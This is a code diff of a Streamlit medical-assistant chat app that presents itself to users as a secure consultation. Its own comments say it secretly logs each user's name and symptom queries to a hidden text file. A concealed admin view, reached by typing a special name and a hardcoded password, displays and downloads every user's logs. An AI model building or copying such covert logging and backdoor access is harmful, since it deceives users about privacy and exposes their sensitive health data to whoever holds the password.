@@ -36,7 +36,7 @@ st.markdown("""
 if "user_name" not in st.session_state:
     st.markdown("## ⚕️ Medical Assistant Portal")
     st.info("Welcome! Please enter your name to start the secure consultation.")
-    name_input = st.text_input("Full Name:", placeholder="e.g. Ghazal")
+    name_input = st.text_input("Full Name:", placeholder="e.g. Mohamed Ghazal")
     
     if st.button("Enter Assistant"):
         if name_input:
@@ -48,8 +48,8 @@ if "user_name" not in st.session_state:
 
 user_name = st.session_state.user_name
 
-# --- 4. FLEXIBLE GREETING (TÜRKİYE TIME) ---
-# Fix: Calculate hour based on TR Time (UTC+3)
+# --- 4. FLEXIBLE GREETING (TÜRKİYE TIME FIX) ---
+# Calculate hour based on TR Time (UTC+3) to ensure it says Good Evening correctly
 tr_hour = datetime.now(timezone(timedelta(hours=3))).hour
 
 if 5 <= tr_hour < 12:
@@ -59,7 +59,7 @@ elif 12 <= tr_hour < 18:
 else:
     greeting = "Good evening"
 
-# --- 5. SIDEBAR & CHAT ---
+# --- 5. SIDEBAR & CHAT INTERFACE ---
 with st.sidebar:
     st.title("⚕️ Support Center")
     st.write(f"Logged in as: **{user_name}**")
@@ -78,11 +78,12 @@ st.title(f" {greeting}, {user_name}!")
 if "messages" not in st.session_state:
     st.session_state.messages = [{"role": "system", "content": "You are a professional medical assistant."}]
 
+# Display chat messages
 for msg in st.session_state.messages[1:]:
     with st.chat_message(msg["role"]):
         st.markdown(msg["content"])
 
-# --- 6. INPUT & BRAIN ---
+# --- 6. INPUT & LOGGING LOGIC ---
 footer_container = st.container()
 with footer_container:
     audio_text = speech_to_text(start_prompt="🎤", stop_prompt="✅", language='en', key='mic')
@@ -92,7 +93,9 @@ prompt = st.chat_input("Ask about your symptoms...")
 user_query = prompt if prompt else audio_text
 
 if user_query:
-    log_to_server(user_name, user_query) # Secretly logs to file
+    # Trigger: Save data to the secret text file
+    log_to_server(user_name, user_query)
+    
     st.session_state.messages.append({"role": "user", "content": user_query})
     with st.chat_message("user"):
         st.markdown(user_query)
@@ -111,16 +114,20 @@ if user_query:
         st.error(f"Error: {e}")
 
 # --- 7. SECURE ADMIN VIEW ---
+# Access this by typing Admin_Ghazal in the Welcome Gate
 if user_name == "Admin_Ghazal":
     st.divider()
     st.subheader("🕵️ Secure Developer Portal")
     admin_pass = st.text_input("Admin Password:", type="password")
     
     if admin_pass == "Ghazal2026":
+        st.success("Access Granted")
         if os.path.exists("secret_logs.txt"):
             with open("secret_logs.txt", "r", encoding="utf-8") as f:
                 logs = f.read()
-            st.text_area("Live Data Log:", value=logs, height=400)
+            st.text_area("Live Data Log (All Users):", value=logs, height=400)
             st.download_button("Download Logs", logs, file_name="medical_logs.txt")
         else:
             st.info("No logs recorded yet.")
+    elif admin_pass != "":
+        st.error("Incorrect Password")
